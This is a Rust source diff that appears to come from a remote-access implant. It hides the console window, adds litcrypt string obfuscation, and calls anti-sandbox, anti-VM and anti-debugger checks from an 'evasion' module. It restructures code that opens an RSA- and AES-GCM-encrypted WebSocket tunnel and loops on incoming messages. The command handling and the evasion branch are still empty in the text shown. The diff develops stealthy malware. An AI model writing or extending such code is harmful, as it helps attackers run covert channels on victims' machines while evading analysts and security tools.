@@ -1,3 +1,5 @@
+#![windows_subsystem = "windows"]
+
 use aes_gcm::{
     aead::{Aead, KeyInit},
     Aes256Gcm, Key, Nonce,
@@ -6,6 +8,13 @@ use rand::{distributions::Alphanumeric, Rng};
 use rsa::{pkcs1::DecodeRsaPublicKey, Pkcs1v15Encrypt, RsaPublicKey};
 use std::net::TcpStream;
 use tungstenite::{connect, stream::MaybeTlsStream, Message, WebSocket};
+
+mod evasion;
+
+#[macro_use]
+extern crate litcrypt;
+
+use_litcrypt!();
 
 struct EncryptedTunnel {
     key: Vec<u8>,
@@ -47,17 +56,7 @@ fn random_bytes(l: usize) -> Vec<u8> {
     rand.as_bytes().to_vec()
 }
 
-fn connection(mut etunnel: EncryptedTunnel) {
-    loop {
-        let msg = String::from_utf8(etunnel.recv()).unwrap();
-
-        match msg {
-            _ => {}
-        }
-    }
-}
-
-fn main() {
+fn init_conn() {
     let key = random_bytes(32);
     let nonce = random_bytes(16);
 
@@ -91,4 +90,20 @@ fn main() {
         .unwrap();
 
     connection(etunnel);
+}
+
+fn connection(mut etunnel: EncryptedTunnel) {
+    loop {
+        let msg = String::from_utf8(etunnel.recv()).unwrap();
+
+        match msg {
+            _ => {}
+        }
+    }
+}
+
+fn main() {
+    if evasion::antisnb() || evasion::antivm() || evasion::antidbg() {
+
+    }
 }
